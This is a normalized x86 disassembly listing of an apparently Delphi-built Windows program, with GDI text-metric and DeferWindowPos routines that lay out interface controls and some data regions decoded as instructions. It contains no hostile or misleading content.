jne r-xdata
pop edi
pop esi
pop ebx
retn
mov [ ebx ] 0x0
sub_429154
push ebx
push esi
push ecx
mov [ esp ] cl
mov esi edx
mov ebx eax
mov edx esi
mov cl [ esp ]
mov eax ebx
call sub_43c96c
mov edx esi
mov cl [ esp ]
mov eax [ ebx + 0x30 ]
mov si 0xffbc
call sub_403430
pop edx
pop esi
pop ebx
retn
sub_429180
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_42d5ec
mov eax [ r-xdata ]
mov [ ebx + 0x50 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403204
mov [ ebx + 0x210 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403204
mov esi eax
mov [ ebx + 0x214 ] esi
mov [ esi + 0x24 ] ebx
mov [ esi + 0x20 ] sub_429430
mov [ ebx + 0x218 ] 0xffffffff
mov [ ebx + 0x21c ] 0x1
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_403540
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_403598
pop [ fs : 0x0 ]
add esp 0xc
sub_429210
push ebx
push esi
call sub_4035a8
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_4294a4
mov eax [ esi + 0x214 ]
xor edx edx
mov [ eax + 0x20 ] edx
mov [ eax + 0x24 ] edx
call sub_403234
mov eax [ esi + 0x210 ]
call sub_403234
mov edx ebx
and dl 0xfc
mov eax esi
call sub_43f800
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403590
sub_429260
push ebp
mov ebp esp
add esp 0xffffffa8
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebx + 0x210 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ ebx + 0x220 ] 0x0
jne r-xdata
push 0x0
call GetDC
mov esi eax
mov eax [ ebx + 0x68 ]
call sub_41c24c
push eax
push esi
call SelectObject
mov edi eax
lea eax [ ebp - 0x58 ]
push eax
push esi
call GetTextMetricsA
push edi
push esi
call SelectObject
push esi
push 0x0
call ReleaseDC
mov eax [ ebx + 0x210 ]
mov esi [ eax + 0x8 ]
mov eax esi
mov ecx [ ebx + 0x21c ]
add eax ecx
dec eax
cdq
idiv ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebx + 0x48 ]
sub eax 0xa
cdq
idiv ecx
mov [ ebp - 0x8 ] eax
mov eax [ ebx + 0x4c ]
mov ecx [ ebp - 0x58 ]
sub eax ecx
sub eax 0x5
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
cdq
idiv [ ebp - 0x4 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x14 ]
cdq
idiv [ ebp - 0x4 ]
sar edx 0x1
jns r-xdata
inc ecx
add edx ecx
mov [ ebp - 0x10 ] edx
push esi
call BeginDeferWindowPos
mov [ ebp - 0x18 ] eax
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0x210 ]
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
adc edx 0x0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x18 ]
push eax
call EndDeferWindowPos
retn
inc eax
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x14 ] 0x0
push 0x14
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x14 ]
cdq
idiv [ ebp - 0x4 ]
imul edx [ ebp - 0xc ]
add edx [ ebp - 0x10 ]
push edx
mov eax [ ebp - 0x1c ]
push eax
push 0x0
mov eax edi
call sub_43db40
push eax
mov eax [ ebp - 0x18 ]
push eax
call DeferWindowPos
mov [ ebp - 0x18 ] eax
mov dl 0x1
mov eax edi
call sub_437278
inc [ ebp - 0x14 ]
dec [ ebp - 0x20 ]
jne r-xdata
mov eax ebx
call sub_436d5c
sub eax [ ebp - 0x1c ]
sub eax [ ebp - 0x8 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebx + 0x210 ]
mov edx [ ebp - 0x14 ]
call sub_413840
mov edi eax
mov dl [ ebx + 0x5f ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x70 ]
mov eax [ ebp - 0x14 ]
cdq
idiv [ ebp - 0x4 ]
imul [ ebp - 0x8 ]
add eax 0x8
mov [ ebp - 0x1c ] eax
mov eax edi
mov si 0xffc8
call sub_403430
test al al
je r-xdata
sub_4293f8
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x221 ] 0x0
jne r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x210 ]
call sub_41389c
mov [ ebx + 0x218 ] eax
mov eax ebx
call sub_436f64
mov eax ebx
mov si 0xffeb
call sub_403430
sub_429430
push ebx
mov ebx eax
cmp [ ebx + 0x220 ] 0x0
jne r-xdata
pop ebx
retn
mov eax [ ebx + 0x214 ]
mov edx [ eax ]
call [ edx + 0x14 ]
cmp eax [ ebx + 0x218 ]
jg r-xdata
mov eax ebx
call sub_4295a8
mov eax [ ebx + 0x214 ]
mov edx [ eax ]
call [ edx + 0x14 ]
dec eax
mov [ ebx + 0x218 ] eax
sub_4294a4
push ebx
push esi
push edi
mov esi edx
mov ebx eax
jmp r-xdata
mov eax [ ebx + 0x210 ]
cmp esi [ eax + 0x8 ]
jg r-xdata
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_428fc8
jmp r-xdata
mov edi [ ebx + 0x210 ]
cmp esi [ edi + 0x8 ]
jl r-xdata
mov eax edi
call sub_413928
call sub_403234
pop edi
pop esi
pop ebx
retn
sub_4294e4
push ebx
mov ebx eax
cmp edx 0x1
jge r-xdata
cmp edx 0x10
jle r-xdata
mov edx 0x1
cmp edx [ ebx + 0x21c ]
je r-xdata
mov edx 0x10
pop ebx
retn
mov [ ebx + 0x21c ] edx
mov eax ebx
call sub_429260
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
sub_42951c
push ebx
push esi
push edi
push ebp
mov esi edx
mov ebx eax
cmp [ ebx + 0x220 ] 0x0
je r-xdata
cmp esi 0xffffffff
jge r-xdata
mov [ ebx + 0x218 ] esi
jmp r-xdata
mov ebp [ ebx + 0x210 ]
mov eax [ ebp + 0x8 ]
cmp esi eax
jl r-xdata
or esi 0xffffffff
pop ebp
pop edi
pop esi
pop ebx
retn
mov edi [ ebx + 0x218 ]
cmp esi edi
je r-xdata
mov esi eax
dec esi
test edi edi
jl r-xdata
mov edi esi
mov [ ebx + 0x218 ] edi
test edi edi
jl r-xdata
mov edx edi
mov eax ebp
call sub_413840
xor edx edx
mov ecx [ eax ]
call [ ecx + 0xcc ]
mov edx edi
mov eax [ ebx + 0x210 ]
call sub_413840
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0xcc ]
sub_4295a8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x8 ] edx
mov ebx eax
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0x214 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov edx eax
mov eax ebx
call sub_4294a4
mov eax [ ebx + 0x210 ]
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
cmp [ ebx + 0x218 ] 0x0
jl r-xdata
inc eax
mov [ ebp - 0x4 ] eax
xor esi esi
mov eax ebx
call sub_429260
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_429678
lea eax [ ebp - 0x8 ]
call sub_403f6c
retn
mov [ ebx + 0x221 ] 0x1
mov edx [ ebx + 0x218 ]
mov eax [ ebx + 0x210 ]
call sub_413840
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0xcc ]
mov [ ebx + 0x221 ] 0x0
lea ecx [ ebp - 0x8 ]
mov edx esi
mov eax [ ebx + 0x214 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0x8 ]
push eax
mov edx esi
mov eax [ ebx + 0x210 ]
call sub_413840
pop edx
call sub_437388
inc esi
dec [ ebp - 0x4 ]
jne r-xdata
sub_429680
push ebx
push esi
push edi
mov ebx eax
mov eax ebx
call sub_43d02c
mov eax [ ebx + 0x210 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
pop edi
pop esi
pop ebx
retn
inc esi
xor edi edi
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
push eax
mov edx edi
mov eax [ ebx + 0x210 ]
call sub_413840
pop edx
mov ecx [ eax ]
call [ ecx + 0x64 ]
inc edi
dec esi
jne r-xdata
sub_4296f4
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
mov ecx esi
xor edx edx
mov eax edi
call sub_42db34
mov edx r-xdata
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov dl 0x1
mov eax edi
call sub_419950
test esi esi
je r-xdata
add esp 0xfffffff0
call sub_403540
mov eax edi
test bl bl
je r-xdata
mov edx [ esi + 0x8 ]
mov eax edi
call sub_437388
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_403598
pop [ fs : 0x0 ]
add esp 0xc
sub_429765
add [ eax ] al
add [ ebx + 0x56 ] dl
mov ebx eax
mov eax ebx
call sub_42de68
mov esi [ ebx + 0x4 ]
mov eax esi
mov edx [ r-xdata ]
call sub_4033c0
test al al
je r-xdata
pop esi
pop ebx
retn
mov eax esi
mov edx [ r-xdata ]
call sub_4033e4
mov dl [ eax + 0x224 ]
call sub_429914
sub_4297b4
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_4297b0
push eax
push esi
mov eax ebx
call sub_4297ac
push eax
mov eax ebx
call sub_4297a8
mov edx eax
mov eax ebx
pop ecx
mov ebx [ eax ]
call [ ebx + 0x84 ]
pop esi
pop ebx
retn
sub_4297e4
push ebx
push esi
mov esi edx
mov ebx eax
push esi
mov eax ebx
call sub_4297a4
push eax
mov eax ebx
call sub_4297ac
push eax
mov eax ebx
call sub_4297a8
mov edx eax
mov eax ebx
pop ecx
mov ebx [ eax ]
call [ ebx + 0x84 ]
pop esi
pop ebx
retn
sub_429814
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_42e160
mov [ esi + 0x224 ] 0x0
mov [ esi + 0x228 ] 0x3
mov eax esi
call sub_429afc
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403540
mov eax esi
pop esi
pop ebx
retn
call sub_403598
pop [ fs : 0x0 ]
add esp 0xc
sub_429880
push esi
mov esi eax
mov eax esi
call sub_43d02c
mov eax esi
mov edx [ eax ]
call [ edx + 0x50 ]
mov edx eax
mov eax [ esi + 0x220 ]
mov ecx [ eax ]
call [ ecx + 0x64 ]
pop esi
retn
sub_4298bc
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov ecx ebx
mov edx esi
mov eax edi
call sub_436828
cmp esi [ edi + 0x220 ]
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp bl 0x1
jne r-xdata
xor eax eax
mov [ edi + 0x220 ] eax
sub_4298ec
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_43d52c
mov dl [ ebx + 0x224 ]
mov eax ebx
call sub_429914
pop ebx
pop ebp
retn 0x8
sub_429914
push ebx
push esi
add esp 0xfffffff8
mov esi eax
cmp [ esi + 0x220 ] 0x0
je r-xdata
pop ecx
pop edx
pop esi
pop ebx
retn
mov [ esi + 0x224 ] dl
sub dl 0x1
jb r-xdata
mov eax [ esi + 0x220 ]
call sub_4297a4
mov edx [ esi + 0x44 ]
sub edx eax
sub edx [ esi + 0x228 ]
mov ecx esp
mov eax [ esi + 0x40 ]
call sub_4123e4
jmp r-xdata
je r-xdata
mov ebx [ esi + 0x220 ]
mov eax ebx
call sub_4297b0
push eax
mov eax [ esi + 0x220 ]
call sub_4297a4
push eax
mov ecx [ esp + 0xc ]
mov edx [ esp + 0x8 ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x84 ]
mov ecx esp
mov edx [ esi + 0x44 ]
add edx [ esi + 0x4c ]
add edx [ esi + 0x228 ]
mov eax [ esi + 0x40 ]
call sub_4123e4
jmp r-xdata
dec dl
je r-xdata
mov eax [ esi + 0x220 ]
call sub_4297a4
mov edx [ esi + 0x4c ]
sub edx eax
sar edx 0x1
jns r-xdata
dec dl
je r-xdata
add edx [ esi + 0x44 ]
push edx
mov eax [ esi + 0x220 ]
call sub_4297b0
push eax
mov eax [ esi + 0x40 ]
pop edx
sub eax edx
sub eax [ esi + 0x228 ]
lea ecx [ esp + 0x4 ]
pop edx
call sub_4123e4
jmp r-xdata
adc edx 0x0
mov eax [ esi + 0x220 ]
call sub_4297a4
mov edx [ esi + 0x4c ]
sub edx eax
sar edx 0x1
jns r-xdata
jmp r-xdata
add edx [ esi + 0x44 ]
mov ecx esp
mov eax [ esi + 0x40 ]
add eax [ esi + 0x48 ]
add eax [ esi + 0x228 ]
call sub_4123e4
adc edx 0x0
sub_429a34
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
test [ ebx + 0x1c ] 0x10
je r-xdata
mov edx esi
mov eax ebx
call sub_437140
test [ ebx + 0x1c ] 0x10
je r-xdata
mov eax [ ebx + 0x220 ]
call sub_4372cc
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_429ac1
lea eax [ ebp - 0x4 ]
call sub_403f6c
retn
xor edx edx
mov eax ebx
call sub_437388
mov edx esi
mov eax [ ebx + 0x220 ]
call sub_437388
lea edx [ ebp - 0x4 ]
mov eax [ ebx + 0x220 ]
call sub_437358
mov eax [ ebp - 0x4 ]
mov edx [ ebx + 0x8 ]
call sub_407af4
test eax eax
jne r-xdata
sub_429ac8
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_43722c
mov edi [ ebx + 0x220 ]
test edi edi
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edx esi
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x68 ]
mov dl 0x1
mov eax [ ebx + 0x220 ]
call sub_437278
sub_429afc
push ebx
push esi
mov ebx eax
cmp [ ebx + 0x220 ] 0x0
jne r-xdata
pop esi
pop ebx
retn
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_4296f4
mov esi eax
mov [ ebx + 0x220 ] esi
mov edx ebx
mov eax esi
call sub_4192b0
mov edx ebx
mov eax [ ebx + 0x220 ]
call sub_42df60
sub_429b38
push ss
inc esi
add [ eax ] bh
inc [ eax ]
add [ esi + edx + 0x46 ] ah
add [ ecx ] bh
inc [ eax ]
add [ esi + edx + 0x46 ] ah
add [ edx ] bh
inc [ eax ]
add [ esi + edx + 0x46 ] ah
add [ ebx ] bh
inc [ eax ]
add [ esi + edx + 0x46 ] ah
add [ edi + edi * 8 ] bh
add [ eax ] al
push ss
inc esi
add [ 0x640000ff ] bh
push ss
inc esi
add [ esi ] bh
inc [ eax ]
add [ esi + edx + 0x46 ] ah
add [ edi ] bh
inc [ eax ]
add [ esi + edx + 0x46 ] ah
add [ eax ] ah
inc [ eax ]
add [ esi + edx + 0x46 ] ah
add [ ecx ] ah
inc [ eax ]
add [ esi + edx + 0x46 ] ah
add [ edx ] ah
inc [ eax ]
add [ esi + edx + 0x46 ] ah
add [ ebx ] ah
inc [ eax ]
add [ esi + edx + 0x46 ] ah
add [ edi + edi * 8 ] ah
add [ eax ] al
push ss
inc esi
add [ 0x640000ff ] ah
push ss
inc esi
add [ esi ] ah
inc [ eax ]
add [ esi + edx + 0x46 ] ah
add [ edi ] ah
inc [ eax ]
add [ esi + edx + 0x46 ] ah
add [ eax ] ch
inc [ eax ]
add [ esi + edx + 0x46 ] ah
add [ ecx ] ch
inc [ eax ]
add [ esi + edx + 0x46 ] ah
add [ edx ] ch
inc [ eax ]
add [ esi + edx + 0x46 ] ah
add [ ebx ] ch
inc [ eax ]
add [ esi + edx + 0x46 ] ah
add [ edi + edi * 8 ] ch
add [ eax ] al
push ss
inc esi
add [ 0x640000ff ] ch
push ss
inc esi
add [ esi ] ch
inc [ eax ]
add [ esi + edx + 0x46 ] ah
add [ edi ] ch
inc [ eax ]
add [ esi + edx + 0x46 ] ah
add [ eax ] dl
inc [ eax ]
add [ esi + edx + 0x46 ] ah
add [ ecx ] dl
inc [ eax ]
add [ esi + edx + 0x46 ] ah
add [ edx ] dl
inc [ eax ]
add [ esi + edx + 0x46 ] ah
add [ ebx ] dl
inc [ eax ]
add [ esi + edx + 0x46 ] ah
add [ edi + edi * 8 ] dl
add [ eax ] al
push ss
inc esi
add [ 0x640000ff ] dl
push ss
inc esi
add [ esi ] dl
inc [ eax ]
add [ esi + edx + 0x46 ] ah
add [ edi ] dl
inc [ eax ]
add [ esi + edx + 0x46 ] ah
add [ eax ] bl
inc [ eax ]
add [ esi + edx + 0x46 ] ah
add [ ecx ] bl
inc [ eax ]
add [ esi + edx + 0x46 ] ah
add [ edx ] bl
inc [ eax ]
add [ esi + edx + 0x46 ] ah
add [ ebx ] bl
inc [ eax ]
add [ esi + edx + 0x46 ] ah
add [ edi + edi * 8 ] bl
add [ eax ] al
push ss
inc esi
add [ 0x640000ff ] bl
push ss
inc esi
add [ esi ] bl
inc [ eax ]
add [ esi + edx + 0x46 ] ah
add [ edi ] bl
inc [ eax ]
add [ esi + edx + 0x46 ] ah
add [ eax ] al
inc [ eax ]
add [ esi + edx + 0x46 ] ah
add [ ecx ] al
inc [ eax ]
add [ esi + edx + 0x46 ] ah
add [ edx ] al
inc [ eax ]
add [ esi + edx + 0x46 ] ah
add [ ebx ] al
inc [ eax ]
add [ esi + edx + 0x46 ] ah
add [ edi + edi * 8 ] al
add [ eax ] al
push ss
inc esi
add [ 0x640000ff ] al
push ss
inc esi
add [ esi ] al
inc [ eax ]
add [ edi ] ch
add [ eax ] al
add [ ecx + edi * 8 + 0x45 ] bh
add [ eax + 0x7400429c ] ch
stc
inc ebp
add [ eax + 0x6c00429c ] ah
stc
inc ebp
add [ eax + 0x6400429c ] bl
stc
inc ebp
add [ eax + 0x5c00429c ] dl
stc
inc ebp
add [ eax + 0x5400429c ] cl
stc
inc ebp
add [ eax + 0x4c00429c ] al
stc
inc ebp
add [ eax - 0x64 ] bh
inc edx
add [ ecx + edi * 8 + 0x45 ] al
add [ eax - 0x64 ] dh
inc edx
add [ ecx + edi * 8 ] bh
inc ebp
add [ eax - 0x64 ] ch
inc edx
add [ ecx + edi * 8 ] dh
inc ebp
add [ eax - 0x64 ] ah
inc edx
add [ ecx + edi * 8 ] ch
inc ebp
add [ eax - 0x64 ] bl
inc edx
add [ ecx + edi * 8 ] ah
inc ebp
add [ eax - 0x64 ] dl
inc edx
add [ ecx + edi * 8 ] bl
inc ebp
add [ eax - 0x64 ] cl
inc edx
add [ ecx + edi * 8 ] dl
inc ebp
add [ eax - 0x64 ] al
inc edx
add [ ecx + edi * 8 ] cl
inc ebp
add [ eax ] bh
pushfd
inc edx
add [ ecx + edi * 8 ] al
inc ebp
add [ eax ] dh
pushfd
inc edx
add ah bh
clc
inc ebp
add [ eax ] ch
pushfd
inc edx
add ah dh
clc
inc ebp
add [ eax ] ah
pushfd
inc edx
add ah ch
clc
inc ebp
add [ eax ] bl
pushfd
inc edx
add ah ah
clc
inc ebp
add [ eax ] dl
pushfd
inc edx
add ah bl
clc
inc ebp
add [ eax ] cl
pushfd
inc edx
add ah dl
clc
inc ebp
add [ eax ] al
pushfd
inc edx
add ah cl
clc
inc ebp
add al bh
fwait
inc edx
add ah al
clc
inc ebp
add al dh
fwait
inc edx
add [ eax + edi * 8 - 0x6417ffbb ] bh
inc edx
add [ eax + edi * 8 - 0x641fffbb ] dh
inc edx
add [ eax + edi * 8 - 0x6427ffbb ] ch
inc edx
add [ eax + edi * 8 - 0x642fffbb ] ah
inc edx
add [ eax + edi * 8 - 0x6437ffbb ] bl
inc edx
add [ eax + edi * 8 - 0x643fffbb ] dl
inc edx
add [ eax + edi * 8 - 0x6447ffbb ] cl
inc edx
add [ eax + edi * 8 - 0x644fffbb ] al
inc edx
add [ eax + edi * 8 + 0x45 ] bh
add [ eax + 0x7400429b ] ch
clc
inc ebp
add [ eax + 0x6c00429b ] ah
clc
inc ebp
add [ eax + 0x6400429b ] bl
clc
inc ebp
add [ eax + 0x5c00429b ] dl
clc
inc ebp
add [ eax + 0x5400429b ] cl
clc
inc ebp
add [ eax + 0x4c00429b ] al
clc
inc ebp
add [ eax - 0x65 ] bh
inc edx
add [ eax + edi * 8 + 0x45 ] al
add [ eax - 0x65 ] dh
inc edx
add [ eax + edi * 8 ] bh
inc ebp
add [ eax - 0x65 ] ch
inc edx
add [ eax + edi * 8 ] dh
inc ebp
add [ eax - 0x65 ] ah
inc edx
add [ eax + edi * 8 ] ch
inc ebp
add [ eax - 0x65 ] bl
inc edx
add [ eax + edi * 8 ] ah
inc ebp
add [ eax - 0x65 ] dl
inc edx
add [ eax + edi * 8 ] bl
inc ebp
add [ eax - 0x65 ] cl
inc edx
add [ eax + edi * 8 ] dl
inc ebp
add [ eax - 0x65 ] al
inc edx
add [ eax + edi * 8 ] cl
inc ebp
add [ eax ] bh
fwait
inc edx
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_429e6f
retn
mov eax rw-data
mov ecx 0x2f
mov edx [ r-xdata ]
call sub_4049e8
sub_429ea4
push ebp
mov ebp esp
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_429ed0
retn
sub_429edc
push ebp
mov ebp esp
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_429f14
retn
mov eax [ rw-data ]
call sub_403234
sub_429fc4
or al [ eax ]
add [ eax ] al
test al 0xf9
inc ebp
add ah dh
inc [ ebp ]
add [ eax ] al
add [ eax ] al
movsb [ edi ] [ esi ]
stc
inc ebp
add ah ah
inc [ ebp ]
add [ eax ] al
add [ eax ] al
mov al [ 0xffffffff900045f9 ]
inc [ ebp ]
add [ eax ] al
add [ eax ] al
pushfd
stc
inc ebp
add [ eax - 0x1 ] bl
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax + 0x200045f9 ] bl
add [ esi ] al
add [ eax ] al
add [ eax ] al
xchg esp eax
stc
inc ebp
add [ eax ] al
add al [ esi ]
add [ eax ] al
add [ eax ] al
nop
stc
inc ebp
add [ eax + eax + 0x46 ] dl
add [ eax ] al
add [ eax ] al
add [ ecx + edi * 8 + 0xcc0045 ] cl
inc esi
add [ eax ] al
add [ eax ] al
add [ eax - 0x17ffba07 ] cl
add [ esi ] eax
add [ eax ] al
add [ eax ] al
test cl bh
inc ebp
add [ eax + 0x45fe ] dh
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42a073
retn
call sub_429fa8
sub_42a0a0
push ebp
mov ebp esp
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42a0cc
retn
sub_42a0e7
inc [ ecx ]
add [ eax ] al
add [ ecx ] dh
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42a133
retn
mov eax rw-data
mov ecx 0x2
mov edx [ r-xdata ]
call sub_4049e8
sub_42a14f
inc [ ecx ]
add [ eax ] al
add [ ecx ] dh
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42a19b
retn
mov eax rw-data
mov ecx 0x2
mov edx [ r-xdata ]
call sub_4049e8
sub_42a1b2
push eax
dec ecx
xor esi [ edx ]
inc esp
dec esp
dec esp
add [ eax ] al
push ebp
mov ebp esp
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42a208
retn
cmp [ rw-data ] 0x0
je r-xdata
mov eax rw-data
call sub_403f6c
mov eax [ rw-data ]
push eax
call FreeLibrary
sub_42a214
push ebp
mov ebp esp
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42a25f
retn
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
push eax
call FreeLibrary
sub_42a26c
push ebp
mov ebp esp
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42a298
retn
sub_42a3a4
push ebp
mov ebp esp
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42a41a
retn
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
push eax
call FreeLibrary
mov eax rw-data
mov edx [ r-xdata ]
call sub_40499c
mov eax rw-data
mov edx [ r-xdata ]
call sub_40499c
mov eax [ rw-data ]
push eax
call FreeLibrary
sub_42a66c
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
call sub_423e54
mov [ esi + 0x5 ] al
call sub_42a344
cmp eax 0x60000
setge al
mov [ esi + 0x4 ] al
mov eax esi
call sub_42aeb0
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403540
mov eax esi
pop esi
pop ebx
retn
call sub_403598
pop [ fs : 0x0 ]
add esp 0xc
sub_42a6b8
push ebx
push esi
call sub_4035a8
mov ebx edx
mov esi eax
mov eax esi
call sub_42a758
call sub_423c94
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403224
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403590
sub_42a6ec
push ebx
push esi
push edi
mov ebx edx
mov esi eax
cmp [ esi + 0x6 ] 0x0
je r-xdata
xor eax eax
mov al bl
mov eax [ esi + eax * 4 + 0x8 ]
pop edi
pop esi
pop ebx
retn
xor eax eax
mov al bl
cmp [ esi + eax * 4 + 0x8 ] 0x0
jne r-xdata
mov edi ebx
and edi 0x7f
mov eax [ edi * 4 + rw-data ]
push eax
push 0x0
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov [ esi + edi * 4 + 0x8 ] eax
sub_42a758
push ebx
push esi
push edi
mov esi eax
xor ebx ebx
inc ebx
cmp bl 0x18
jne r-xdata
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
xor eax eax
mov [ esi + edi * 4 + 0x8 ] eax
mov edi ebx
and edi 0x7f
mov eax [ esi + edi * 4 + 0x8 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
sub_42a79c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov esi ecx
lea edi [ ebp - 0xc ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0x14 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
push esi
mov dl [ ebp - 0xc ]
mov eax ebx
call sub_42a6ec
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
sub_42a7e8
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov esi ecx
lea edi [ ebp - 0xc ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
